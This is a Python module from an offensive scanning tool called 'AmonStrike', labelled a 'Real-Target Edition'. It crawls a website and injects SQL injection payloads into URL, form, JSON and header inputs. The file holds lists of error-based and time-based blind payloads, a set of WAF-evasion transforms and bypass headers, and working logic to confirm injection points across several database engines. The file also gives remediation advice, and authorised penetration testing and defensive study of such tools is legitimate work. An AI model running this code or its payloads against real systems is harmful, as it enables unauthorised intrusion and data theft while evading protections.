"""
AmonStrike — SQL Injection Module (Real-Target Edition)
Finds SQLi in: URL params, POST forms, JSON APIs, HTTP headers.
Handles: WAF bypass, blind time-based, all DB types.
"""
import re
import time
from .base import BaseModule
from urllib.parse import urlparse, parse_qs, urlencode, urljoin

# Error-based signatures for all major DB engines
SQL_ERRORS = [
    # MySQL
    (r"You have an error in your SQL syntax", "MySQL"),
    (r"mysql_fetch_array\(\)", "MySQL"),
    (r"mysql_num_rows\(\)", "MySQL"),
    (r"supplied argument is not a valid MySQL", "MySQL"),
    (r"Column count doesn't match", "MySQL"),
    (r"mysql_fetch_assoc\(\)", "MySQL"),
    (r"Warning: mysql_", "MySQL"),
    # SQLite
    (r"unrecognized token", "SQLite"),
    (r"SQLite3::", "SQLite"),
    (r"sqlite3\.OperationalError", "SQLite"),
    (r"near .+: syntax error", "SQLite"),
    # PostgreSQL
    (r"pg_query\(\)", "PostgreSQL"),
    (r"pg_exec\(\)", "PostgreSQL"),
    (r"PostgreSQL.*ERROR", "PostgreSQL"),
    (r"PSQLException", "PostgreSQL"),
    (r"ERROR:.*syntax error at", "PostgreSQL"),
    # MSSQL
    (r"Microsoft OLE DB Provider for SQL Server", "MSSQL"),
    (r"Unclosed quotation mark after the character string", "MSSQL"),
    (r"SqlException", "MSSQL"),
    (r"\[Microsoft\]\[ODBC SQL Server Driver\]", "MSSQL"),
    (r"Incorrect syntax near", "MSSQL"),
    # Oracle
    (r"ORA-\d{5}", "Oracle"),
    (r"Oracle error", "Oracle"),
    (r"oracle\.jdbc", "Oracle"),
    # Generic
    (r"SQL syntax.*error", "Generic"),
    (r"syntax error.*SQL", "Generic"),
    (r"database error", "Generic"),
    (r"ODBC SQL", "Generic"),
    (r"DB2 SQL error", "DB2"),
]

# Payloads that trigger errors across all DB types
ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    '"',
    "\\",
    "1'",
    "1\"",
    "1`",
    "' OR '1'='1",
    "' OR 1=1--",
    "1 AND 1=1",
    "1 AND 1=2",
    "1' AND '1'='1",
    "1; SELECT 1--",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",  # causes error if columns < 100
    "1 UNION SELECT NULL--",
    "1' UNION SELECT NULL--",
    "1 OR SLEEP(0)--",
    "'||'",
    "1; WAITFOR DELAY '0:0:0'--",
]

# Time-based blind payloads per DB
TIME_PAYLOADS = [
    ("1 AND SLEEP(4)", "MySQL", 4),
    ("1'; SELECT SLEEP(4)--", "MySQL", 4),
    ("1 AND (SELECT * FROM (SELECT SLEEP(4))a)--", "MySQL", 4),
    ("1; WAITFOR DELAY '0:0:4'--", "MSSQL", 4),
    ("1'; WAITFOR DELAY '0:0:4'--", "MSSQL", 4),
    ("1 AND 1=(SELECT 1 FROM pg_sleep(4))", "PostgreSQL", 4),
    ("1; SELECT pg_sleep(4)--", "PostgreSQL", 4),
    ("1 AND SLEEP(4)=0", "MySQL", 4),
]

# Parameters likely to be injectable
INJECTABLE_PARAMS = [
    "id", "user_id", "uid", "pid", "tid", "aid", "bid", "cid",
    "cat", "category", "cat_id", "page", "p", "pg",
    "artist", "product", "item", "news", "article", "blog", "post",
    "order", "record", "view", "show", "get", "fetch", "load",
    "search", "q", "query", "keyword", "s", "find",
    "name", "user", "username", "email",
    "type", "sort", "order_by", "orderby", "dir",
    "filter", "where", "field", "column",
    "start", "offset", "limit", "count",
    "lang", "language", "locale",
    "year", "month", "day", "date",
    "file", "path", "template", "theme",
    "ref", "url", "link", "href",
    "action", "mode", "format", "output",
]

# WAF bypass techniques for payloads
WAF_BYPASSES = [
    lambda p: p,                          # original
    lambda p: p.replace(" ", "/**/"),     # comment bypass
    lambda p: p.replace(" ", "%20"),      # URL encode spaces
    lambda p: p.replace("'", "%27"),      # encode quotes
    lambda p: p.replace("=", "like"),     # = → LIKE
    lambda p: p.upper(),                  # uppercase
    lambda p: p.replace("OR", "||"),      # operator swap
    lambda p: p.replace("AND", "&&"),     # operator swap
    lambda p: p.replace("SLEEP", "BENCHMARK(1000000,MD5(1))"),  # MySQL func swap
]


class SqliModule(BaseModule):
    NAME        = "sqli"
    DESCRIPTION = "SQL Injection — error, blind, time-based, POST, JSON, headers"

    def run(self):
        self.log("Testing SQL injection vectors...")

        # Phase 1: Spider target for all endpoints
        endpoints = self._spider()
        self.log(f"Found {len(endpoints)} testable endpoints", "i")

        # Phase 2: Test each endpoint
        for ep in endpoints[:40]:
            self._test_endpoint(ep)
            if len(self.findings) >= 3:
                break  # enough evidence

        # Phase 3: Time-based blind on promising params
        if not self.findings:
            self._test_blind()

        self.log(f"SQLi scan complete — {len(self.findings)} findings", "+")
        return self.result()

    def _spider(self) -> list:
        """Collect all endpoints worth testing."""
        endpoints = []
        seen = set()

        # 1. Current URL if it has params
        parsed = urlparse(self.url)
        if parsed.query:
            endpoints.append({"url": self.url, "method": "GET",
                              "params": parse_qs(parsed.query), "type": "url"})

        # 2. Spider homepage
        r = self.get("")
        if r:
            # Links with query params
            for link in re.findall(r'href=["\']([^"\'#]+)["\']', r.text):
                abs_url = link if link.startswith("http") else urljoin(self.url, link)
                if self.parsed.netloc not in abs_url:
                    continue
                p = urlparse(abs_url)
                if p.query and abs_url not in seen:
                    seen.add(abs_url)
                    endpoints.append({"url": abs_url, "method": "GET",
                                     "params": parse_qs(p.query), "type": "link"})

            # Forms
            for form in self.extract_forms(r):
                action = form.get("action","") or ""
                if not action.startswith("http"):
                    action = urljoin(self.url, action)
                if action not in seen:
                    seen.add(action)
                    endpoints.append({"url": action, "method": form.get("method","get").upper(),
                                     "params": form.get("inputs",{}), "type": "form"})

            # API calls from JS
            for api in re.findall(r'(?:fetch|axios|\.get|\.post)\s*\(\s*["\']([/][^"\']+)', r.text):
                abs_api = urljoin(self.url, api)
                if abs_api not in seen:
                    seen.add(abs_api)
                    endpoints.append({"url": abs_api, "method": "GET",
                                     "params": {}, "type": "api"})

        # 3. Extra endpoints from recon
        for ep_url in getattr(self, "extra_endpoints", [])[:20]:
            if ep_url not in seen:
                seen.add(ep_url)
                p = urlparse(ep_url)
                endpoints.append({"url": ep_url, "method": "GET",
                                 "params": parse_qs(p.query), "type": "recon"})

        # 4. Common injectable paths to try
        for param in INJECTABLE_PARAMS[:10]:
            test_url = f"{self.url}?{param}=1"
            if test_url not in seen:
                seen.add(test_url)
                endpoints.append({"url": test_url, "method": "GET",
                                 "params": {param: ["1"]}, "type": "common"})

        return endpoints

    def _test_endpoint(self, ep: dict):
        """Test one endpoint for SQLi."""
        url    = ep["url"]
        method = ep["method"]
        params = ep["params"]

        if not params:
            return

        for param_name, param_values in params.items():
            orig_val = param_values[0] if isinstance(param_values, list) else param_values

            # Try error-based payloads
            for payload in ERROR_PAYLOADS[:12]:
                for bypass in WAF_BYPASSES[:3]:
                    test_payload = bypass(payload)
                    resp = self._inject(url, method, params, param_name,
                                       str(orig_val) + test_payload)
                    if not resp:
                        continue

                    match = self._is_sqli(resp.text)
                    if match:
                        db_type, pattern = match
                        self._report(url, method, param_name,
                                    str(orig_val) + test_payload, resp, db_type, pattern)
                        return  # Found it, move on

    def _inject(self, url: str, method: str, all_params: dict,
                inject_param: str, payload: str):
        """Send request with injected parameter."""
        test_params = {}
        for k, v in all_params.items():
            test_params[k] = v[0] if isinstance(v, list) else v
        test_params[inject_param] = payload

        if method == "POST":
            # Try form-encoded first, then JSON
            r = self.post(url.split("?")[0], data=test_params)
            if r and r.status_code == 415:  # Unsupported Media Type
                r = self.post(url.split("?")[0], json=test_params)
        else:
            r = self.get(url.split("?")[0], params=test_params)

        # 403 → try WAF bypass headers
        if r and r.status_code == 403:
            for bypass_hdrs in self.WAF_BYPASS_HEADERS[1:3]:
                r2 = self.get(url.split("?")[0], params=test_params,
                             headers=bypass_hdrs)
                if r2 and r2.status_code != 403:
                    return r2

        return r

    def _is_sqli(self, text: str):
        """Check if response contains SQL error. Returns (db_type, pattern) or None."""
        for pattern, db_type in SQL_ERRORS:
            if re.search(pattern, text, re.I):
                return (db_type, pattern)
        return None

    def _test_blind(self):
        """Time-based blind SQLi on common params."""
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)

        # Build param list to test
        test_cases = []
        for k, v in params.items():
            test_cases.append((self.url, "GET", {k: v[0]}, k))

        # Add common params
        for param in INJECTABLE_PARAMS[:8]:
            test_url = f"{self.url.split('?')[0]}?{param}=1"
            test_cases.append((test_url, "GET", {param: "1"}, param))

        for url, method, params_dict, param_name in test_cases[:10]:
            for payload, db_name, delay in TIME_PAYLOADS[:4]:
                t0 = time.time()
                resp = self._inject(url, method, params_dict, param_name, payload)
                elapsed = time.time() - t0

                if elapsed >= delay * 0.85:
                    self.add_finding(
                        title       = f"Blind SQL Injection (Time-based) — '{param_name}'",
                        severity    = "CRITICAL",
                        description = (
                            f"Time-based blind SQL injection confirmed via parameter '{param_name}'. "
                            f"Injected {delay}s delay — response took {elapsed:.1f}s. "
                            f"Target DB appears to be {db_name}."
                        ),
                        evidence    = (
                            f"URL: {url}\nParameter: {param_name}\n"
                            f"Payload: {payload}\n"
                            f"Expected delay: {delay}s\nActual delay: {elapsed:.1f}s"
                        ),
                        remediation = "Use parameterized queries / prepared statements.",
                        url         = url,
                        parameter   = param_name,
                        payload     = payload,
                        cve         = "CWE-89",
                    )
                    self.info["sqli_blind_param"] = param_name
                    return

    def _report(self, url, method, param, payload, resp, db_type, pattern):
        # Extract the actual error from response
        error_match = re.search(pattern, resp.text, re.I)
        error_snippet = resp.text[max(0,error_match.start()-50):error_match.end()+150].strip() if error_match else resp.text[:300]

        self.add_finding(
            title       = f"SQL Injection ({db_type}) — Parameter '{param}' [{method}]",
            severity    = "CRITICAL",
            description = (
                f"{db_type} SQL injection confirmed via {method} parameter '{param}'. "
                f"The database returned an error exposing the injection point. "
                f"An attacker can extract all data, bypass authentication, "
                f"and potentially execute OS commands."
            ),
            evidence    = (
                f"URL: {url}\nMethod: {method}\nParameter: {param}\n"
                f"Payload: {payload}\nDB Type: {db_type}\n"
                f"Error: {error_snippet}"
            ),
            remediation = (
                "1. Use parameterized queries (prepared statements)\n"
                "2. Never concatenate user input into SQL strings\n"
                "3. Implement input validation\n"
                "4. Apply least privilege to DB account"
            ),
            url         = url,
            parameter   = param,
            payload     = payload,
            cve         = "CWE-89",
        )
        self.info["sqli_db_type"] = db_type
        self.info["sqli_param"]   = param
